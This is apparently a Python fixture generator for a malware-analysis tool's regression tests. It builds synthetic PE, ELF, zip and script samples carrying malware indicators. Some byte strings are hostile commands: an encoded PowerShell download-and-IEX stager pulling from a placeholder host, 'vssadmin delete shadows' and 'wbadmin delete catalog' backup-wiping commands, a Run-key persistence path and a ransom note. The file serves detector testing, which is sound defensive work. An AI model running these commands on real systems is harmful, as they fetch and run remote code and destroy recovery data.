#!/usr/bin/env python3
"""Generate synthetic artefacts for Assay regression testing.

Why generate instead of committing binaries?

* A repository that ships real malware samples is either blocked by GitHub,
  flagged by every scanner on earth, or both.
* Synthetic samples document *exactly* which structural feature triggers which
  detector. If a rule stops firing, the fixture tells you what changed.
* They are tiny, reviewable, and reproducible byte-for-byte.

Every artefact here is inert data. Nothing is executable code that does
anything; the "malicious" ones contain API *names* and *strings*, never working
logic.

Usage:
    python scripts/make_samples.py [--out samples]

The output of this script is what `tests/e2e.py` (and CI) analyses.
"""

from __future__ import annotations

import argparse
import io
import os
import struct
import sys
import zipfile
from pathlib import Path

# --------------------------------------------------------------------------
# PE construction
# --------------------------------------------------------------------------

FILE_ALIGN = 0x200
SECT_ALIGN = 0x1000
NT_OFFSET = 0x80
OPT_SIZE = 0xE0  # PE32 optional header size


def _align(value: int, align: int) -> int:
    return (value + align - 1) // align * align


def build_pe(
    *,
    imports: list[tuple[str, list[str]]] | None = None,
    sections: list[tuple[str, bytes, int]] | None = None,
    signed: bool = False,
    dll: bool = False,
    extra_overlay: bytes = b"",
) -> bytes:
    """Build a PE32 image with a real import table.

    ``imports`` is a list of ``(dll_name, [function, ...])``.
    ``sections`` is a list of ``(name, payload, characteristics)``.
    """
    imports = imports or []
    sections = sections or [(".text", b"\x90" * 512, 0x60000020)]

    # Reserve a slot for .idata when imports are requested.
    has_idata = bool(imports)
    if has_idata:
        sections = sections + [(".idata", b"", 0xC0000040)]

    n_sections = len(sections)
    headers_size = _align(NT_OFFSET + 24 + OPT_SIZE + n_sections * 40, FILE_ALIGN)

    # Assign RVAs / raw offsets.
    layout: list[dict] = []
    raw_cursor = headers_size
    rva_cursor = SECT_ALIGN
    for name, payload, chars in sections:
        vsize = max(len(payload), 1)
        rsize = _align(len(payload), FILE_ALIGN) if payload else 0
        layout.append(
            {
                "name": name,
                "payload": payload,
                "chars": chars,
                "va": rva_cursor,
                "vs": vsize,
                "raw": raw_cursor,
                "rs": rsize,
            }
        )
        raw_cursor += rsize
        rva_cursor += _align(vsize, SECT_ALIGN)

    image_size = rva_cursor

    # ---- Build .idata ----------------------------------------------------
    idata_blob = b""
    export_dir = (0, 0)
    import_dir = (0, 0)
    if has_idata:
        idata_rva = next(s["va"] for s in layout if s["name"] == ".idata")
        desc_count = len(imports) + 1
        desc_size = desc_count * 20
        cursor = desc_size

        descriptors = b""
        thunk_blocks = b""
        name_blob = b""

        # First pass: compute where each block lives.
        blocks: list[dict] = []
        for dll_name, funcs in imports:
            ilt_off = cursor
            cursor += (len(funcs) + 1) * 4
            iat_off = cursor
            cursor += (len(funcs) + 1) * 4
            hint_names_off = cursor
            # Each IMAGE_IMPORT_BY_NAME: 2-byte hint + NUL-terminated name.
            hint_size = sum(2 + len(f) + 1 for f in funcs)
            cursor += hint_size
            hint_size = sum(2 + len(f) + 1 for f in funcs)
            if hint_size % 2:
                cursor += 1
            dll_off = cursor
            cursor += len(dll_name) + 1
            blocks.append(
                {
                    "dll": dll_name,
                    "funcs": funcs,
                    "ilt": ilt_off,
                    "iat": iat_off,
                    "hint_names": hint_names_off,
                    "dll_off": dll_off,
                }
            )

        total = cursor
        idata_buf = bytearray(total)

        for idx, block in enumerate(blocks):
            thunk_cursor = block["hint_names"]
            thunks = b""
            for func in block["funcs"]:
                thunks += struct.pack("<I", idata_rva + thunk_cursor)
                entry = struct.pack("<H", 0) + func.encode() + b"\x00"
                idata_buf[thunk_cursor : thunk_cursor + len(entry)] = entry
                thunk_cursor += len(entry)
            thunks += struct.pack("<I", 0)

            idata_buf[block["ilt"] : block["ilt"] + len(thunks)] = thunks
            idata_buf[block["iat"] : block["iat"] + len(thunks)] = thunks

            name_bytes = block["dll"].encode() + b"\x00"
            idata_buf[block["dll_off"] : block["dll_off"] + len(name_bytes)] = name_bytes

            desc = struct.pack(
                "<IIIII",
                idata_rva + block["ilt"],
                0,
                0,
                idata_rva + block["dll_off"],
                idata_rva + block["iat"],
            )
            descriptors += desc

        descriptors += b"\x00" * 20
        idata_buf[0:len(descriptors)] = descriptors
        idata_blob = bytes(idata_buf)
        import_dir = (idata_rva, len(idata_blob))

        for entry in layout:
            if entry["name"] == ".idata":
                entry["payload"] = idata_blob
                entry["vs"] = len(idata_blob)
                entry["rs"] = _align(len(idata_blob), FILE_ALIGN)
        # Recompute image size after .idata grew.
        image_size = max(
            s["va"] + _align(s["vs"], SECT_ALIGN) for s in layout
        )

    # ---- Assemble the file ----------------------------------------------
    # Recompute the tail because .idata grew after the first layout pass.
    end_of_image = headers_size
    for entry in layout:
        if entry["rs"]:
            end_of_image = max(end_of_image, entry["raw"] + entry["rs"])
    body = bytearray(_align(end_of_image, FILE_ALIGN))
    for entry in layout:
        if entry["rs"] and entry["payload"]:
            start = entry["raw"]
            body[start : start + len(entry["payload"])] = entry["payload"]

    # DOS header
    body[0:2] = b"MZ"
    body[0x3C:0x40] = struct.pack("<I", NT_OFFSET)

    # NT signature + COFF header
    body[NT_OFFSET:NT_OFFSET + 4] = b"PE\x00\x00"
    characteristics = 0x0102
    if dll:
        characteristics |= 0x2000
    struct.pack_into(
        "<HHIIIHH",
        body,
        NT_OFFSET + 4,
        0x014C,               # machine: i386
        n_sections,
        0x65432100,           # timestamp
        0,
        0,
        OPT_SIZE,
        characteristics,
    )

    # Optional header (PE32)
    opt = NT_OFFSET + 24
    struct.pack_into("<H", body, opt, 0x010B)
    body[opt + 2] = 14
    body[opt + 3] = 0
    struct.pack_into("<I", body, opt + 16, layout[0]["va"])          # entry point
    struct.pack_into("<I", body, opt + 28, 0x00400000)               # image base
    struct.pack_into("<I", body, opt + 32, SECT_ALIGN)
    struct.pack_into("<I", body, opt + 36, FILE_ALIGN)
    struct.pack_into("<I", body, opt + 56, image_size)
    struct.pack_into("<I", body, opt + 60, headers_size)
    struct.pack_into("<H", body, opt + 68, 2)                        # subsystem: GUI
    struct.pack_into("<H", body, opt + 70, 0x8140)                   # dll characteristics
    struct.pack_into("<I", body, opt + 92, 16)                       # NumberOfRvaAndSizes

    # Data directories
    dir_base = opt + 96
    struct.pack_into("<II", body, dir_base + 0 * 8, *export_dir)
    struct.pack_into("<II", body, dir_base + 1 * 8, *import_dir)
    if signed:
        # A certificate table whose offset points past EOF: structurally
        # declared but empty, which is exactly what a stripped signature looks
        # like.
        cert_off = len(body)
        struct.pack_into("<II", body, dir_base + 4 * 8, cert_off, 0)

    # Section table
    sec_base = opt + OPT_SIZE
    for i, entry in enumerate(layout):
        off = sec_base + i * 40
        name = entry["name"].encode()[:8].ljust(8, b"\x00")
        body[off : off + 8] = name
        struct.pack_into("<I", body, off + 8, entry["vs"])
        struct.pack_into("<I", body, off + 12, entry["va"])
        struct.pack_into("<I", body, off + 16, entry["rs"])
        struct.pack_into("<I", body, off + 20, entry["raw"] if entry["rs"] else 0)
        struct.pack_into("<I", body, off + 36, entry["chars"])

    if extra_overlay:
        body += extra_overlay

    return bytes(body)


def high_entropy(n: int, seed: int = 1) -> bytes:
    """Deterministic pseudo-random bytes (no ``random`` import needed)."""
    out = bytearray(n)
    state = seed * 2654435761 + 1
    for i in range(n):
        state = (state * 1103515245 + 12345) & 0xFFFFFFFF
        out[i] = (state >> 16) & 0xFF
    return bytes(out)


# --------------------------------------------------------------------------
# ELF construction
# --------------------------------------------------------------------------

def build_elf64(*, rpath: str | None = None, exec_stack: bool = False) -> bytes:
    """Build a minimal ET_DYN ELF64 with an optional DT_RPATH.

    Section layout is ``null | .text | .dynamic | .dynstr | .comment``. The
    ``.dynstr`` section must exist and be linked from ``.dynamic`` — without it
    the dynamic tags resolve against the wrong string table and RPATH reads as
    empty, which is a mistake real toolchains never make.
    """
    ehsize, phentsize, shentsize = 64, 56, 64
    phoff = ehsize
    phnum = 2 if rpath else 1
    shoff = phoff + phentsize * phnum
    shnum = 5
    data_start = shoff + shentsize * shnum

    dynstr = bytearray(b"\x00")
    dt_entries: list[tuple[int, int]] = []
    text = b"\x90" * 64
    comment = b"GCC: (GNU) 13.2.0\x00"

    if rpath:
        rpath_off = len(dynstr)
        dynstr += rpath.encode() + b"\x00"
        dt_entries.append((15, rpath_off))       # DT_RPATH
        dt_entries.append((0, 0))                # DT_NULL
        dyn_size = len(dt_entries) * 16
    else:
        dyn_size = 16
        dt_entries = [(0, 0)]

    dynstr_off = data_start
    dyn_off = dynstr_off + len(dynstr)
    comment_off = dyn_off + dyn_size
    text_off = comment_off + len(comment)
    total = text_off + len(text)

    buf = bytearray(total)
    buf[0:4] = b"\x7fELF"
    buf[4] = 2          # ELFCLASS64
    buf[5] = 1          # ELFDATA2LSB
    buf[6] = 1          # EV_CURRENT
    struct.pack_into("<H", buf, 16, 3)          # ET_DYN
    struct.pack_into("<H", buf, 18, 62)         # EM_X86_64
    struct.pack_into("<I", buf, 20, 1)
    struct.pack_into("<Q", buf, 24, 0x1000)     # entry
    struct.pack_into("<Q", buf, 32, phoff)
    struct.pack_into("<Q", buf, 40, shoff)
    struct.pack_into("<H", buf, 52, ehsize)
    struct.pack_into("<H", buf, 54, phentsize)
    struct.pack_into("<H", buf, 56, phnum)
    struct.pack_into("<H", buf, 58, shentsize)
    struct.pack_into("<H", buf, 60, shnum)

    # PT_LOAD
    p = phoff
    struct.pack_into("<I", buf, p + 0, 1)
    struct.pack_into("<I", buf, p + 4, 5)
    struct.pack_into("<Q", buf, p + 32, total)
    struct.pack_into("<Q", buf, p + 40, total)

    if rpath:
        # PT_DYNAMIC
        p2 = phoff + phentsize
        struct.pack_into("<I", buf, p2 + 0, 2)
        struct.pack_into("<I", buf, p2 + 4, 6)
        struct.pack_into("<Q", buf, p2 + 8, dyn_off)
        struct.pack_into("<Q", buf, p2 + 16, dyn_off)
        struct.pack_into("<Q", buf, p2 + 32, dyn_size)
        struct.pack_into("<Q", buf, p2 + 40, dyn_size)

    def shdr(idx: int, name: int, stype: int, flags: int, addr: int, off: int,
             size: int, link: int = 0, entsize: int = 0) -> None:
        b = shoff + idx * shentsize
        struct.pack_into("<I", buf, b + 0, name)
        struct.pack_into("<I", buf, b + 4, stype)
        struct.pack_into("<Q", buf, b + 8, flags)
        struct.pack_into("<Q", buf, b + 16, addr)
        struct.pack_into("<Q", buf, b + 24, off)
        struct.pack_into("<Q", buf, b + 32, size)
        struct.pack_into("<I", buf, b + 40, link)
        struct.pack_into("<Q", buf, b + 56, entsize)

    shdr(0, 0, 0, 0, 0, 0, 0)
    shdr(1, 0, 1, 6, 0x1000, text_off, len(text))            # .text  PROGBITS AX
    shdr(2, 0, 6, 3, 0, dyn_off, dyn_size, link=3, entsize=16)  # .dynamic -> .dynstr
    shdr(3, 0, 3, 2, 0, dynstr_off, len(dynstr))             # .dynstr STRTAB
    shdr(4, 0, 1, 0, 0, comment_off, len(comment))           # .comment

    buf[dynstr_off : dynstr_off + len(dynstr)] = dynstr
    for i, (tag, val) in enumerate(dt_entries):
        struct.pack_into("<QQ", buf, dyn_off + i * 16, tag, val)
    buf[comment_off : comment_off + len(comment)] = comment
    buf[text_off : text_off + len(text)] = text

    if exec_stack:
        struct.pack_into("<I", buf, p + 4, 7)

    return bytes(buf)


# --------------------------------------------------------------------------
# Sample definitions
# --------------------------------------------------------------------------

def sample_benign() -> bytes:
    """A plain, unremarkable executable: many imports, low entropy, no IOCs."""
    funcs = [
        "GetStdHandle", "WriteFile", "ReadFile", "CloseHandle", "ExitProcess",
        "GetLastError", "SetLastError", "Sleep", "GetTickCount", "QueryPerformanceCounter",
        "HeapAlloc", "HeapFree", "GetProcessHeap", "InitializeCriticalSection",
        "EnterCriticalSection", "LeaveCriticalSection", "DeleteCriticalSection",
        "GetModuleHandleA", "GetProcAddress", "LoadLibraryA", "FreeLibrary",
        "MultiByteToWideChar", "WideCharToMultiByte", "GetSystemTimeAsFileTime",
        "GetCurrentProcessId", "GetCurrentThreadId", "SetUnhandledExceptionFilter",
        "UnhandledExceptionFilter", "TerminateProcess", "IsProcessorFeaturePresent",
    ]
    return build_pe(imports=[("kernel32.dll", funcs)])


def sample_packed() -> bytes:
    """Named like a UPX stub, near-maximum entropy, no imports."""
    payload = high_entropy(24_000, seed=7)
    return build_pe(
        imports=[],
        sections=[("UPX0", high_entropy(4096, seed=3), 0xE0000020)],
        extra_overlay=payload,
    )


def sample_suspicious() -> bytes:
    """Unsigned, injection-capable, network-aware, W+X section."""
    injection = ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"]
    recon = ["IsDebuggerPresent", "GetAsyncKeyState", "CreateToolhelp32Snapshot"]
    network = ["InternetOpenA", "HttpSendRequestA", "URLDownloadToFileA"]
    payload = (
        b"http://update-check.example-services.net/gate.php\x00"
        b"http://185.220.101.42/beacon\x00"
        b"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\x00"
        b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\x00"
        b"powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA\x00"
    )
    return build_pe(
        imports=[
            ("kernel32.dll", injection + ["CreateProcessA", "GetComputerNameA"]),
            ("user32.dll", ["GetAsyncKeyState", "SetWindowsHookExA"]),
            ("wininet.dll", network),
            ("psapi.dll", recon),
        ],
        sections=[
            (".text", payload + b"\x90" * 64, 0xE0000020),  # W+X on purpose
            (".data", high_entropy(2048, seed=11), 0xC0000040),
        ],
        signed=False,
    )


def sample_ransom_note() -> bytes:
    """Ransomware-shaped: cipher primitives plus extortion strings."""
    return build_pe(
        imports=[
            ("advapi32.dll", ["CryptAcquireContextA", "CryptGenKey", "CryptEncrypt"]),
            ("kernel32.dll", ["CreateProcessA", "FindFirstFileA", "MoveFileExA"]),
        ],
        sections=[
            (
                ".text",
                b"Your files have been encrypted. Pay in bitcoin to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\r\n"
                b"vssadmin delete shadows /all /quiet\r\n"
                b"wbadmin delete catalog -quiet\r\n",
                0x60000020,
            )
        ],
    )


def sample_rpath_elf() -> bytes:
    """ELF with a relative RPATH, the library-hijacking shape."""
    return build_elf64(rpath="$ORIGIN/../lib")


def sample_package() -> bytes:
    """Zip that ships an executable next to a README."""
    inner = sample_benign()
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("README.txt", "Build artefacts for the demo service.\n")
        zf.writestr("bin/launcher.exe", inner)
        zf.writestr("scripts/install.sh", "#!/bin/sh\nexec ./bin/launcher.exe\n")
    return buf.getvalue()


def sample_script() -> bytes:
    """A staging script with the usual obfuscation markers."""
    return (
        b"powershell -NoP -NonI -W Hidden -EncodedCommand SQBFAFgA\n"
        b"$c = New-Object Net.WebClient\n"
        b"$c.DownloadString('http://cdn.example-updates.net/a')\n"
        b"[System.Convert]::FromBase64String($payload)\n"
        b"IEX $decoded\n"
    )


SAMPLES: dict[str, callable] = {
    "benign.exe": sample_benign,
    "packed.exe": sample_packed,
    "suspicious.exe": sample_suspicious,
    "ransom.exe": sample_ransom_note,
    "librpath.so": sample_rpath_elf,
    "bundle.zip": sample_package,
    "stager.sh": sample_script,
}


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--out", default="samples", help="output directory")
    args = parser.parse_args()

    out = Path(args.out)
    out.mkdir(parents=True, exist_ok=True)

    for name, builder in SAMPLES.items():
        data = builder()
        target = out / name
        target.write_bytes(data)
        print(f"{name:<18} {len(data):>8} bytes")

    print(f"\nwrote {len(SAMPLES)} artefacts to {out}/")
    return 0


if __name__ == "__main__":
    sys.exit(main())
